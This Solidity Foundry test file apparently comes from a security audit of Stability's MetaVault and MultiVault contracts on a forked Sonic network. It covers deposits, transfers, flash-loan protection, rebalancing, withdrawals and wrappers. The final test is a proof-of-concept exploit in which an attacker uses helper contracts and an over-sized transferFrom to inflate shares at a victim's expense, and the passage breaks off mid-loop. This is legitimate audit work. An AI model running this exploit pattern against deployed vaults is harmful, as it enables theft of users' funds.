// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {IERC20, IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {Test, console} from "forge-std/Test.sol";
import {MetaVault, IMetaVault, IStabilityVault, IPlatform, IPriceReader, IControllable} from "../../src/core/vaults/MetaVault.sol";
import {Proxy} from "../../src/core/proxy/Proxy.sol";
import {CommonLib} from "../../src/core/libs/CommonLib.sol";
import {VaultTypeLib} from "../../src/core/libs/VaultTypeLib.sol";
import {IFactory} from "../../src/interfaces/IFactory.sol";
import {CVault} from "../../src/core/vaults/CVault.sol";
import {SonicConstantsLib} from "../../chains/sonic/SonicConstantsLib.sol";
import {PriceReader} from "../../src/core/PriceReader.sol";
import {IMetaVaultFactory} from "../../src/interfaces/IMetaVaultFactory.sol";
import {IWrappedMetaVault} from "../../src/interfaces/IWrappedMetaVault.sol";
import {Platform} from "../../src/core/Platform.sol";
import {MetaVaultFactory} from "../../src/core/MetaVaultFactory.sol";
import {WrappedMetaVault} from "../../src/core/vaults/WrappedMetaVault.sol";

contract MetaVaultSonicTest is Test {
    address public constant PLATFORM = SonicConstantsLib.PLATFORM;
    IMetaVaultFactory public metaVaultFactory;
    address[] public metaVaults;
    IPriceReader public priceReader;
    address public multisig;

    constructor() {
        // May-14-2025 10:14:19 PM +UTC
        console.log("=== INITIALIZING TEST ENVIRONMENT ===");
        console.log("Forking from Sonic Network at block 26834601");
        vm.selectFork(vm.createFork(vm.envString("SONIC_RPC_URL"), 26834601));
        console.log("Fork created successfully");
    }
    function setUp() public {
        console.log("\n=== TEST SETUP STARTED ===");
        console.log("Current block:", block.number);
        console.log("Current timestamp:", block.timestamp);

        console.log("\nFetching platform configuration:");
        multisig = IPlatform(PLATFORM).multisig();
        console.log("- Platform address:", PLATFORM);
        console.log("- Multisig address:", multisig);

        priceReader = IPriceReader(IPlatform(PLATFORM).priceReader());
        console.log("- Price reader address:", address(priceReader));

        metaVaultFactory = IMetaVaultFactory(
            SonicConstantsLib.METAVAULT_FACTORY
        );
        console.log("- MetaVault factory address:", address(metaVaultFactory));

        console.log("\nConfiguring MetaVault Factory...");
        _setupMetaVaultFactory(); //set metavaultfacotory in the platform contract
        _setupImplementations(); //set metavault and wrappedmetavault by metavaultFactory

        string memory vaultType;
        address[] memory vaults_;
        uint[] memory proportions_;

        metaVaults = new address[](2);

        //===========================================================
        console.log(
            "\nDeploying metaUSDC vault (single USDC lending vaults)..."
        );
        vaultType = VaultTypeLib.MULTIVAULT;
        vaults_ = new address[](5); // list of exisitng yield generating vaults
        vaults_[0] = SonicConstantsLib.VAULT_C_USDC_SiF;
        vaults_[1] = SonicConstantsLib.VAULT_C_USDC_S_8;
        vaults_[2] = SonicConstantsLib.VAULT_C_USDC_S_27;
        vaults_[3] = SonicConstantsLib.VAULT_C_USDC_S_34;
        vaults_[4] = SonicConstantsLib.VAULT_C_USDC_S_36;
        proportions_ = new uint[](5);
        proportions_[0] = 20e16; // 20 % for each vault. 20e16 = 0.2e18
        proportions_[1] = 20e16;
        proportions_[2] = 20e16;
        proportions_[3] = 20e16;
        proportions_[4] = 20e16;
        metaVaults[0] = _deployMetaVaultByMetaVaultFactory(
            vaultType,
            SonicConstantsLib.TOKEN_USDC,
            "Stability USDC",
            "metaUSDC",
            vaults_,
            proportions_
        );
        console.log("metaUSDC deployed at:", metaVaults[0]);
        console.log("Deploying wrapper for metaUSDC...");
        address wrapper = _deployWrapper(metaVaults[0]); //ERC4626-compliant interface around the core MetaVault contract
        console.log("Wrapper deployed at:", wrapper);
        //=====================
        console.log(
            "\nDeploying metaUSD vault (metavault + lending + Ichi LP vaults)..."
        );
        vaultType = VaultTypeLib.METAVAULT;
        vaults_ = new address[](4);
        vaults_[0] = metaVaults[0]; //@>q here we add metavault[0] as one of metavault[1] vaults??!
        vaults_[1] = SonicConstantsLib.VAULT_C_USDC_SiF;
        vaults_[2] = SonicConstantsLib.VAULT_C_USDC_scUSD_ISF_scUSD;
        vaults_[3] = SonicConstantsLib.VAULT_C_USDC_scUSD_ISF_USDC;
        proportions_ = new uint[](4);
        proportions_[0] = 50e16;
        proportions_[1] = 15e16;
        proportions_[2] = 20e16;
        proportions_[3] = 15e16;
        metaVaults[1] = _deployMetaVaultByMetaVaultFactory(
            vaultType,
            address(0),
            "Stability USD",
            "metaUSD",
            vaults_,
            proportions_
        );
        console.log("metaUSD deployed at:", metaVaults[1]);
        console.log("Deploying wrapper for metaUSD...");
        wrapper = _deployWrapper(metaVaults[1]);
        console.log("Wrapper deployed at:", wrapper);

        console.log("\n=== TEST SETUP COMPLETED ===");
    }

    function test_universal_metavault() public {
        console.log("\n=== STARTING UNIVERSAL METAVAULT TEST ===");
        console.log("Testing", metaVaults.length, "MetaVaults");

        // test all metavaults
        for (uint i; i < metaVaults.length; ++i) {
            address metavault = metaVaults[i];
            console.log("\n--- Testing MetaVault", i + 1, "---");
            console.log("MetaVault address:", metavault);
            console.log("Name:", IERC20Metadata(metavault).name()); //openzepplin interface to get metadata of the tokenized vault
            console.log("Symbol:", IERC20Metadata(metavault).symbol());
            console.log("Vault type:", IMetaVault(metavault).vaultType());

            address[] memory assets = IMetaVault(metavault).assetsForDeposit();
            console.log("Deposit assets:", _formatAssetArray(assets));

            console.log("\n>> Preparing $1000 deposit");
            // get amounts for $1000 of each - (1000 * token.decimal()*1e18)/price . price is in 1e18 decimal
            uint[] memory depositAmounts = _getAmountsForDeposit(1000, assets);
            console.log("Deposit amounts:", _formatUintArray(depositAmounts));

            // previewDepositAssets
            console.log("\n>> Previewing deposit");
            (uint[] memory amountsConsumed, uint sharesOut, ) = IStabilityVault(
                metavault
            ).previewDepositAssets(assets, depositAmounts);
            console.log(
                "- Amounts to be consumed:",
                _formatUintArray(amountsConsumed)
            );
            console.log("- Expected shares out:", sharesOut);

            // check previewDepositAssets return values
            (uint consumedUSD, , , ) = priceReader.getAssetsPrice(
                assets,
                amountsConsumed
            );
            console.log("- USD value to be consumed:", consumedUSD / 1e18);

            // deal and approve
            console.log("\n>> Executing first deposit from", address(this));
            _dealAndApprove(address(this), metavault, assets, depositAmounts);
            console.log("- Assets dealt and approved");

            // depositAssets | first deposit
            console.log(
                "- Executing depositAssets with slippage tolerance of 0.01%"
            );
            uint minSharesOut = (sharesOut * 9999) / 10000;
            console.log("- Minimum shares expected:", minSharesOut);

            //@>i this contract Deposits assets
            IStabilityVault(metavault).depositAssets(
                assets,
                depositAmounts,
                minSharesOut,
                address(this)
            );
            console.log("- Deposit successful");

            // check state after first deposit
            {
                uint balance = IERC20(metavault).balanceOf(address(this));
                console.log("\n>> First deposit results:");
                console.log("- User balance:", balance);
                console.log("- Total supply:", IERC20(metavault).totalSupply());

                (uint sharePrice, , , ) = IMetaVault(metavault)
                    .internalSharePrice();
                console.log("- Current share price:", sharePrice / 1e18);
            }

            // depositAssets | second deposit
            {
                console.log("\n>> Executing second deposit from address(1)");
                assets = IMetaVault(metavault).assetsForDeposit();
                depositAmounts = _getAmountsForDeposit(500, assets);
                console.log(
                    "- Deposit amounts:",
                    _formatUintArray(depositAmounts)
                );
                _dealAndApprove(address(1), metavault, assets, depositAmounts);
                console.log("- Assets dealt and approved");

                vm.prank(address(1));
                console.log(
                    "- Executing depositAssets with no slippage protection"
                );
                IStabilityVault(metavault).depositAssets(
                    assets,
                    depositAmounts,
                    0,
                    address(1)
                );
                console.log("- Deposit successful");
                console.log(
                    "- User balance:",
                    IERC20(metavault).balanceOf(address(1))
                );
            }

            // test transfer and transferFrom
            vm.roll(block.number + 6);
            console.log("\n>> Testing transfer functionality");
            console.log("- Rolled forward", 6, "blocks to block", block.number);
            {
                uint user1BalanceBefore = IERC20(metavault).balanceOf(
                    address(1)
                );
                console.log("- User1 balance before:", user1BalanceBefore);

                vm.prank(address(1));
                console.log("- Transferring all from User1 to User2");

                IERC20(metavault).transfer(address(2), user1BalanceBefore);

                console.log(
                    "- User1 balance after:",
                    IERC20(metavault).balanceOf(address(1))
                );
                console.log(
                    "- User2 balance after:",
                    IERC20(metavault).balanceOf(address(2))
                );

                vm.prank(address(1));
                console.log(
                    "- Testing unauthorized transferFrom (should revert)"
                );
                vm.expectRevert();
                IERC20(metavault).transferFrom(
                    address(2),
                    address(1),
                    user1BalanceBefore
                );
                console.log("- Reverted as expected");

                vm.roll(block.number + 6); //@> to skip checklastblock protection
                console.log(
                    "- Rolled forward",
                    6,
                    "blocks to block",
                    block.number
                );

                vm.prank(address(2));
                console.log("- User2 approving User1 to spend tokens");
                IERC20(metavault).approve(address(1), user1BalanceBefore);
                console.log(
                    "- Allowance set:",
                    IERC20(metavault).allowance(address(2), address(1))
                );

                vm.prank(address(1));
                console.log("- User1 transferring tokens from User2");
                //@>i interface is IERC20 but implementation is in metavault
                IERC20(metavault).transferFrom(
                    address(2),
                    address(1),
                    user1BalanceBefore
                );
                console.log(
                    "- User1 balance:",
                    IERC20(metavault).balanceOf(address(1))
                );
                console.log(
                    "- User2 balance:",
                    IERC20(metavault).balanceOf(address(2))
                );
            }

            // depositAssets | third deposit
            {
                console.log("\n>> Executing third deposit from address(3)");
                (, sharesOut, ) = IStabilityVault(metavault)
                    .previewDepositAssets(assets, depositAmounts);
                console.log("- Expected shares out:", sharesOut);

                assets = IMetaVault(metavault).assetsForDeposit();
                depositAmounts = _getAmountsForDeposit(500, assets);
                _dealAndApprove(address(3), metavault, assets, depositAmounts);

                vm.prank(address(3));
                console.log(
                    "- Executing depositAssets with 1% slippage tolerance"
                );
                uint minSharesForUser3 = sharesOut - sharesOut / 100;
                console.log("- Minimum shares expected:", minSharesForUser3);
                IStabilityVault(metavault).depositAssets(
                    assets,
                    depositAmounts,
                    minSharesForUser3,
                    address(3)
                );
                console.log("- Deposit successful");
                console.log(
                    "- User3 balance:",
                    IERC20(metavault).balanceOf(address(3))
                );
            }

            // flash loan protection check
            {
                console.log("\n>> Testing flash loan protection");
                uint bal = IERC20(metavault).balanceOf(address(3)); //@>i balance of address(3) in metavault token
                console.log("- User3 balance:", bal);

                // transfer
                vm.prank(address(3));
                console.log(
                    "- User3 trying to transfer in same block (should revert)"
                );
                vm.expectRevert(
                    abi.encodeWithSelector(
                        IStabilityVault.WaitAFewBlocks.selector
                    )
                );
                IERC20(metavault).transfer(address(10), bal);
                console.log("- Reverted as expected");

                // deposit
                _dealAndApprove(address(3), metavault, assets, depositAmounts);
                vm.prank(address(3));
                console.log(
                    "- User3 trying to deposit again in same block (should revert)"
                );
                vm.expectRevert(
                    abi.encodeWithSelector(
                        IStabilityVault.WaitAFewBlocks.selector
                    )
                );
                IStabilityVault(metavault).depositAssets(
                    assets,
                    depositAmounts,
                    0,
                    address(3)
                );
                console.log("- Reverted as expected");

                // withdraw
                vm.prank(address(3));
                console.log(
                    "- User3 trying to withdraw in same block (should revert)"
                );
                vm.expectRevert(
                    abi.encodeWithSelector(
                        IStabilityVault.WaitAFewBlocks.selector
                    )
                );
                IStabilityVault(metavault).withdrawAssets(
                    assets,
                    bal,
                    new uint[](assets.length)
                );
                console.log("- Reverted as expected");
            }

            // deposit slippage check
            {
                console.log("\n>> Testing deposit slippage protection");
                vm.roll(block.number + 6);
                console.log("- Rolled forward 6 blocks to block", block.number);

                uint minSharesOut = IERC20(metavault).balanceOf(address(3));
                console.log("- User3 balance:", minSharesOut);
                console.log(
                    "- Testing deposit with impossible slippage requirement (2x current balance)"
                );

                _dealAndApprove(address(3), metavault, assets, depositAmounts);
                vm.prank(address(3));
                vm.expectRevert();
                IStabilityVault(metavault).depositAssets(
                    assets,
                    depositAmounts,
                    minSharesOut * 2,
                    address(3)
                );
                console.log("- Reverted as expected");
            }

            // check proportions
            {
                console.log("\n>> Current vault proportions:");
                uint[] memory props = IMetaVault(metavault)
                    .currentProportions();
                for (uint j = 0; j < props.length; j++) {
                    string memory percentStr = string(
                        abi.encodePacked(Strings.toString(props[j] / 1e16), "%")
                    );
                    console.log("- Vault", j, ":", percentStr);
                }
            }

            vm.warp(block.timestamp + 600);
            skip(600);
            console.log(
                "\n>> Skipped 600 seconds, now at timestamp",
                block.timestamp
            );

            // report
            {
                console.log("\n>> Emitting APR report");
                vm.prank(multisig);
                (uint sharePrice, int apr, , uint duration) = IMetaVault(
                    metavault
                ).emitAPR();
                console.log("- Share price:", sharePrice / 1e18);

                string memory aprStr;
                if (apr < 0) {
                    aprStr = string(
                        abi.encodePacked(
                            "-",
                            Strings.toString(uint256(-apr) / 1e16),
                            "%"
                        )
                    );
                } else {
                    aprStr = string(
                        abi.encodePacked(
                            Strings.toString(uint256(apr) / 1e16),
                            "%"
                        )
                    );
                }
                console.log("- APR:", aprStr);

                console.log("- Duration:", duration, "seconds");

                (uint tvl, ) = IStabilityVault(metavault).tvl();
                console.log("\n>> MetaVault Summary:");
                console.log(
                    string.concat(
                        IERC20Metadata(metavault).symbol(),
                        ". Name: ",
                        IERC20Metadata(metavault).name(),
                        ". Assets: ",
                        CommonLib.implodeSymbols(
                            IStabilityVault(metavault).assets(),
                            ", "
                        ),
                        ". Vaults: ",
                        CommonLib.implodeSymbols(
                            IMetaVault(metavault).vaults(),
                            ", "
                        ),
                        "."
                    )
                );
                console.log("  TVL:", CommonLib.formatUsdAmount(tvl));
            }

            // rebalance
            {
                console.log("\n>> Testing rebalance functionality");
                if (
                    CommonLib.eq(
                        IStabilityVault(metavault).vaultType(),
                        VaultTypeLib.MULTIVAULT
                    )
                ) {
                    uint[] memory proportions = IMetaVault(metavault)
                        .currentProportions();
                    console.log(
                        "- Current proportions:",
                        _formatProportionsArray(proportions)
                    );
                    if (proportions.length == 5) {
                        uint[] memory withdrawShares = new uint[](5);
                        withdrawShares[0] =
                            IERC20(IMetaVault(metavault).vaults()[0]).balanceOf(
                                metavault
                            ) /
                            10;
                        withdrawShares[1] =
                            IERC20(IMetaVault(metavault).vaults()[0]).balanceOf(
                                metavault
                            ) /
                            3;
                        withdrawShares[2] =
                            IERC20(IMetaVault(metavault).vaults()[2]).balanceOf(
                                metavault
                            ) /
                            4;
                        uint[] memory depositAmountsProportions = new uint[](5);
                        depositAmountsProportions[3] = 4e17;
                        depositAmountsProportions[4] = 6e17;

                        console.log(
                            "- Withdraw shares:",
                            _formatUintArray(withdrawShares)
                        );
                        console.log(
                            "- Deposit proportions:",
                            _formatProportionsArray(depositAmountsProportions)
                        );

                        console.log(
                            "- Testing unauthorized rebalance (should revert)"
                        );
                        vm.expectRevert(
                            IControllable.IncorrectMsgSender.selector
                        );
                        IMetaVault(metavault).rebalance(
                            withdrawShares,
                            depositAmountsProportions
                        );
                        console.log("- Reverted as expected");

                        console.log("- Executing authorized rebalance");
                        vm.prank(multisig);
                        IMetaVault(metavault).rebalance(
                            withdrawShares,
                            depositAmountsProportions
                        );

                        proportions = IMetaVault(metavault)
                            .currentProportions();
                        console.log(
                            "- New proportions after rebalance:",
                            _formatProportionsArray(proportions)
                        );
                    }
                }
            }

            // withdraw
            {
                console.log("\n>> Testing withdrawal functionality");
                vm.roll(block.number + 6);
                console.log("- Rolled forward 6 blocks to block", block.number);

                uint maxWithdraw = IMetaVault(metavault).maxWithdrawAmountTx();
                uint userBalance = IERC20(metavault).balanceOf(address(this));
                console.log("- User balance:", userBalance);
                console.log("- Max withdrawal per tx:", maxWithdraw);

                if (maxWithdraw < userBalance) {
                    console.log(
                        "- Testing withdrawal exceeding max (should revert)"
                    );
                    // revert when want withdraw more
                    vm.expectRevert(
                        abi.encodeWithSelector(
                            IMetaVault
                                .MaxAmountForWithdrawPerTxReached
                                .selector,
                            maxWithdraw + 10,
                            maxWithdraw
                        )
                    );
                    IStabilityVault(metavault).withdrawAssets(
                        assets,
                        maxWithdraw + 10,
                        new uint[](assets.length)
                    );
                    console.log("- Reverted as expected");

                    console.log("- Executing max withdrawal");
                    uint[] memory minAssetAmountsOut = new uint[](
                        assets.length
                    );
                    uint[] memory amountsOut = IStabilityVault(metavault)
                        .withdrawAssets(
                            assets,
                            maxWithdraw,
                            minAssetAmountsOut
                        );
                    console.log("- Withdrawal successful");
                    console.log(
                        "- Assets withdrawn:",
                        _formatUintArray(amountsOut)
                    );
                    console.log(
                        "- New user balance:",
                        IERC20(metavault).balanceOf(address(this))
                    );

                    vm.roll(block.number + 6);
                    console.log(
                        "- Rolled forward 6 blocks to block",
                        block.number
                    );
                }

                // reverts
                console.log("\n>> Testing withdrawal edge cases");
                console.log("- Testing zero amount withdrawal (should revert)");
                uint withdrawAmount = 0;
                vm.expectRevert(IControllable.IncorrectZeroArgument.selector);
                IStabilityVault(metavault).withdrawAssets(
                    assets,
                    withdrawAmount,
                    new uint[](assets.length),
                    address(this),
                    address(this)
                );
                console.log("- Reverted as expected");

                withdrawAmount = IERC20(metavault).balanceOf(address(this));
                console.log("- User balance for withdrawal:", withdrawAmount);

                console.log(
                    "- Testing withdrawal exceeding balance (should revert)"
                );
                vm.expectRevert();
                IStabilityVault(metavault).withdrawAssets(
                    assets,
                    withdrawAmount + 1,
                    new uint[](assets.length),
                    address(this),
                    address(this)
                );
                console.log("- Reverted as expected");

                console.log("- Testing mismatched arrays (should revert)");
                vm.expectRevert(IControllable.IncorrectArrayLength.selector);
                IStabilityVault(metavault).withdrawAssets(
                    assets,
                    withdrawAmount,
                    new uint[](assets.length + 1),
                    address(this),
                    address(this)
                );
                console.log("- Reverted as expected");

                if (
                    (IMetaVault(metavault).pegAsset() == address(0) ||
                        IMetaVault(metavault).pegAsset() ==
                        SonicConstantsLib.TOKEN_USDC) && withdrawAmount < 1e16
                ) {
                    console.log(
                        "- Testing tiny withdrawal (may revert due to USD threshold)"
                    );
                    vm.expectRevert();
                    IStabilityVault(metavault).withdrawAssets(
                        assets,
                        withdrawAmount,
                        new uint[](assets.length),
                        address(this),
                        address(this)
                    );
                    console.log("- Reverted as expected");
                } else {
                    console.log("- Executing final withdrawal");
                    uint[] memory minAssetAmountsOut = new uint[](
                        assets.length
                    );
                    uint[] memory amountsOut = IStabilityVault(metavault)
                        .withdrawAssets(
                            assets,
                            withdrawAmount,
                            minAssetAmountsOut,
                            address(this),
                            address(this)
                        );
                    console.log("- Withdrawal successful");
                    console.log(
                        "- Assets withdrawn:",
                        _formatUintArray(amountsOut)
                    );
                    console.log(
                        "- New user balance:",
                        IERC20(metavault).balanceOf(address(this))
                    );
                }
            }

            // use wrapper
            {
                console.log("\n>> Testing wrapper functionality");
                address user = address(10);
                address wrapper = metaVaultFactory.wrapper(metavault);
                console.log("- Wrapper address:", wrapper);

                _dealAndApprove(user, metavault, assets, depositAmounts);
                vm.startPrank(user);

                if (
                    CommonLib.eq(
                        IStabilityVault(metavault).vaultType(),
                        VaultTypeLib.METAVAULT
                    )
                ) {
                    console.log(
                        "- Testing MetaVault wrapper for",
                        IERC20Metadata(metavault).symbol()
                    );

                    console.log(
                        "- User deposits assets to get MetaVault tokens"
                    );
                    IStabilityVault(metavault).depositAssets(
                        assets,
                        depositAmounts,
                        0,
                        user
                    );
                    console.log(
                        "- MetaVault balance:",
                        IERC20(metavault).balanceOf(user)
                    );

                    vm.roll(block.number + 6);
                    console.log("- Rolled forward 6 blocks");

                    uint bal = IERC20(metavault).balanceOf(user);
                    console.log(
                        "- User deposits",
                        bal,
                        "MetaVault tokens into wrapper"
                    );
                    IERC20(metavault).approve(wrapper, bal);
                    IWrappedMetaVault(wrapper).deposit(bal, user);

                    uint wrapperSharesBal = IERC20(wrapper).balanceOf(user);
                    console.log("- Wrapper shares received:", wrapperSharesBal);
                    console.log(
                        "- Total assets in wrapper:",
                        IERC4626(wrapper).totalAssets()
                    );

                    vm.roll(block.number + 6);
                    console.log("- Rolled forward 6 blocks");

                    console.log("- User redeems all wrapper shares");
                    IWrappedMetaVault(wrapper).redeem(
                        wrapperSharesBal,
                        user,
                        user
                    );
                    console.log(
                        "- MetaVault tokens received:",
                        IERC20(metavault).balanceOf(user)
                    );
                    console.log(
                        "- Remaining wrapper shares:",
                        IERC20(wrapper).balanceOf(user)
                    );
                }

                if (
                    CommonLib.eq(
                        IStabilityVault(metavault).vaultType(),
                        VaultTypeLib.MULTIVAULT
                    )
                ) {
                    console.log(
                        "- Testing MultiVault wrapper for",
                        IERC20Metadata(metavault).symbol()
                    );

                    uint bal = IERC20(assets[0]).balanceOf(user);
                    console.log(
                        "- User has",
                        bal,
                        "of",
                        IERC20Metadata(assets[0]).symbol()
                    );

                    console.log("- User deposits assets directly into wrapper");
                    IERC20(assets[0]).approve(wrapper, bal);
                    IWrappedMetaVault(wrapper).deposit(bal, user);

                    uint wrapperSharesBal = IERC20(wrapper).balanceOf(user);
                    console.log("- Wrapper shares received:", wrapperSharesBal);
                    console.log(
                        "- Total assets in wrapper:",
                        IERC4626(wrapper).totalAssets()
                    );

                    vm.roll(block.number + 100);
                    vm.warp(block.timestamp + 100);
                    console.log("- Rolled forward 100 blocks and seconds");

                    uint toAssets = IERC4626(wrapper).convertToAssets(
                        wrapperSharesBal
                    );
                    console.log(
                        "- Value of shares increased from",
                        bal,
                        "to",
                        toAssets
                    );

                    uint maxWithdraw = IERC4626(wrapper).maxWithdraw(user);
                    console.log("- User's max withdraw amount:", maxWithdraw);

                    console.log("- User redeems all wrapper shares");
                    IWrappedMetaVault(wrapper).redeem(
                        Math.min(
                            wrapperSharesBal,
                            IERC4626(wrapper).maxRedeem(user)
                        ),
                        user,
                        user
                    );

                    uint newAssetBal = IERC20(assets[0]).balanceOf(user);
                    console.log("- Assets received:", newAssetBal);
                    console.log(
                        "- Remaining wrapper shares:",
                        IERC20(wrapper).balanceOf(user)
                    );
                }
                vm.stopPrank();
            }

            console.log("\n--- MetaVault", i + 1, "tests completed ---");
        }

        console.log("\n=== UNIVERSAL METAVAULT TEST COMPLETED ===");
    }

    // Helper function to format address arrays for logs
    function _formatAssetArray(
        address[] memory addresses
    ) internal view returns (string memory) {
        if (addresses.length == 0) return "[]";

        string memory result = "[";
        for (uint i = 0; i < addresses.length; i++) {
            if (i > 0) result = string(abi.encodePacked(result, ", "));
            try IERC20Metadata(addresses[i]).symbol() returns (
                string memory symbol
            ) {
                result = string(abi.encodePacked(result, symbol));
            } catch {
                result = string(
                    abi.encodePacked(result, Strings.toHexString(addresses[i]))
                );
            }
        }
        return string(abi.encodePacked(result, "]"));
    }

    // Helper function to format uint arrays for logs
    function _formatUintArray(
        uint[] memory values
    ) internal pure returns (string memory) {
        if (values.length == 0) return "[]";

        string memory result = "[";
        for (uint i = 0; i < values.length; i++) {
            if (i > 0) result = string(abi.encodePacked(result, ", "));
            result = string(
                abi.encodePacked(result, Strings.toString(values[i]))
            );
        }
        return string(abi.encodePacked(result, "]"));
    }

    // Helper function to format proportions array for logs
    function _formatProportionsArray(
        uint[] memory values
    ) internal pure returns (string memory) {
        if (values.length == 0) return "[]";

        string memory result = "[";
        for (uint i = 0; i < values.length; i++) {
            if (i > 0) result = string(abi.encodePacked(result, ", "));
            // Convert from 1e18 scale to percentage
            result = string(
                abi.encodePacked(
                    result,
                    Strings.toString(values[i] / 1e16),
                    "%"
                )
            );
        }
        return string(abi.encodePacked(result, "]"));
    }

    ///======================
    function test_metavault_management() public {
        IMetaVault metavault = IMetaVault(metaVaults[0]);

        // setName, setSymbol
        vm.expectRevert(IControllable.NotOperator.selector);
        metavault.setName("new name");
        vm.prank(multisig);
        metavault.setName("new name");
        assertEq(IERC20Metadata(address(metavault)).name(), "new name");
        vm.prank(multisig);
        metavault.setSymbol("new symbol");
        assertEq(IERC20Metadata(address(metavault)).symbol(), "new symbol");

        // change proportions
        uint[] memory newTargetProportions = new uint[](2);

        vm.expectRevert(IControllable.IncorrectMsgSender.selector);
        metavault.setTargetProportions(newTargetProportions);

        vm.startPrank(multisig);

        vm.expectRevert(IControllable.IncorrectArrayLength.selector);
        metavault.setTargetProportions(newTargetProportions);
        newTargetProportions = new uint[](5);
        vm.expectRevert(IMetaVault.IncorrectProportions.selector);
        metavault.setTargetProportions(newTargetProportions);
        newTargetProportions[0] = 2e17;
        newTargetProportions[1] = 3e17;
        newTargetProportions[2] = 5e17;
        metavault.setTargetProportions(newTargetProportions);
        assertEq(metavault.targetProportions()[2], newTargetProportions[2]);
        vm.stopPrank();

        // add vault
        address vault = SonicConstantsLib.VAULT_C_USDC_scUSD_ISF_scUSD;
        newTargetProportions = new uint[](3);

        vm.expectRevert(IControllable.NotGovernanceAndNotMultisig.selector);
        metavault.addVault(vault, newTargetProportions);

        vm.startPrank(multisig);

        vm.expectRevert(IControllable.IncorrectArrayLength.selector);
        metavault.addVault(vault, newTargetProportions);

        newTargetProportions = new uint[](6);

        vm.expectRevert(IMetaVault.IncorrectProportions.selector);
        metavault.addVault(vault, newTargetProportions);

        newTargetProportions[0] = 1e18;
        vault = SonicConstantsLib.VAULT_C_USDC_S_8;
        vm.expectRevert(IMetaVault.IncorrectVault.selector);
        metavault.addVault(vault, newTargetProportions);

        vm.expectRevert(IMetaVault.IncorrectVault.selector);
        metavault.addVault(vault, newTargetProportions);

        vault = SonicConstantsLib.VAULT_C_USDC_S_49;
        metavault.addVault(vault, newTargetProportions);
        vm.stopPrank();

        assertEq(
            IMetaVault(metavault).vaults()[5],
            SonicConstantsLib.VAULT_C_USDC_S_49
        );
    }

    function test_metavault_view_methods() public view {
        IMetaVault metavault = IMetaVault(metaVaults[0]);
        assertEq(metavault.pegAsset(), SonicConstantsLib.TOKEN_USDC);
        (uint price, bool trusted) = metavault.price();
        assertLt(price, 101e16);
        assertGt(price, 99e16);
        assertEq(trusted, true);
        assertEq(metavault.vaults().length, 5);
        assertEq(metavault.assets().length, 1);
        assertEq(metavault.totalSupply(), 0);
        assertEq(metavault.balanceOf(address(this)), 0);
        assertEq(metavault.targetProportions().length, 5);
        assertEq(metavault.targetProportions()[0], 20e16);
        assertEq(metavault.currentProportions().length, 5);
        assertEq(metavault.currentProportions()[0], 20e16);
        assertEq(
            metavault.vaultForDeposit(),
            SonicConstantsLib.VAULT_C_USDC_SiF
        );
        (uint tvl, ) = metavault.tvl();
        assertEq(tvl, 0);
        assertEq(IERC20Metadata(address(metavault)).name(), "Stability USDC");
        assertEq(IERC20Metadata(address(metavault)).symbol(), "metaUSDC");
        assertEq(IERC20Metadata(address(metavault)).decimals(), 18);

        assertEq(metavault.vaultForWithdraw(), metavault.vaults()[0]);
        assertEq(metavault.vaultType(), VaultTypeLib.MULTIVAULT);
    }

    function test_transferFrom_missing_balance_check_vulnerability() public {
        console.log(
            "\n====== TRANSFERFROM VULNERABILITY EXPLOIT TEST ======\n"
        );

        address metavault = metaVaults[0]; // Use the first metaVault
        address[] memory assets = IMetaVault(metavault).assetsForDeposit();

        // Set up our characters
        address victim = address(0xBEEF);
        address attacker = address(0xBAD);
        address[] memory helperContracts = new address[](5);
        for (uint i = 0; i < 5; i++) {
            helperContracts[i] = address(uint160(0xC0DE + i));
            vm.label(
                helperContracts[i],
                string(abi.encodePacked("Helper", Strings.toString(i)))
            );
        }

        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");

        // 1. Victim makes a significant deposit
        uint victimDepositUSD = 10000; // $10,000
        uint[] memory victimDepositAmounts = _getAmountsForDeposit(
            victimDepositUSD,
            assets
        );
        _dealAndApprove(victim, metavault, assets, victimDepositAmounts);

        console.log("VICTIM DEPOSITS:");
        vm.prank(victim);
        IStabilityVault(metavault).depositAssets(
            assets,
            victimDepositAmounts,
            0,
            victim
        );

        uint victimShares = IERC20(metavault).balanceOf(victim);
        console.log("Victim shares:", victimShares);

        // Roll forward to allow transfers
        vm.roll(block.number + 6);

        // 2. Attacker makes a small deposit
        uint attackerDepositUSD = 100; // $100
        uint[] memory attackerDepositAmounts = _getAmountsForDeposit(
            attackerDepositUSD,
            assets
        );
        _dealAndApprove(attacker, metavault, assets, attackerDepositAmounts);

        console.log("\nATTACKER DEPOSITS:");
        vm.prank(attacker);
        IStabilityVault(metavault).depositAssets(
            assets,
            attackerDepositAmounts,
            0,
            attacker
        );

        uint attackerShares = IERC20(metavault).balanceOf(attacker);
        console.log("Attacker initial shares:", attackerShares);

        // Roll forward to allow transfers
        vm.roll(block.number + 6);

        // 3. Execute the attack
        console.log("\nEXECUTING ATTACK:");

        // Record initial state
        uint totalSupplyBefore = IERC20(metavault).totalSupply();
        console.log("MetaVault total supply before attack:", totalSupplyBefore);

        // Deploy helper contracts
        for (uint i = 0; i < helperContracts.length; i++) {
            // Create a helper contract that will be exploited
            vm.etch(
                helperContracts[i],
                address(new ExploitHelper(metavault)).code
            );
        }

        // Begin Attack Sequence
        vm.prank(attacker);
        // Transfer initial tokens to first helper
        IERC20(metavault).transfer(helperContracts[0], attackerShares);
        console.log("Transferred attacker shares to Helper0");

        // Roll forward to avoid flash loan protection
        vm.roll(block.number + 6);

        // Switch to helper for approval
        vm.prank(helperContracts[0]);
        IERC20(metavault).approve(attacker, attackerShares * 2);
        console.log("Helper0 approved attacker for 2x its balance");

        // Roll forward to avoid flash loan protection
        vm.roll(block.number + 6);

        // Back to attacker to exploit
        vm.prank(attacker);
        IERC20(metavault).transferFrom(
            helperContracts[0],
            attacker,
            attackerShares * 2
        );
        console.log("Attacker extracted 2x tokens from Helper0!");
        console.log(
            "Attacker balance after basic exploit:",
            IERC20(metavault).balanceOf(attacker)
        );

        // Now escalate the attack through multiple helpers for exponential growth
        uint artificialTokens = IERC20(metavault).balanceOf(attacker);

        for (uint i = 0; i < helperContracts.length; i++) {
            // Roll forward to avoid flash loan protection
            vm.roll(block.number + 6);

            // We'll double our tokens with each helper
            uint targetAmount = artificialTokens * 2;

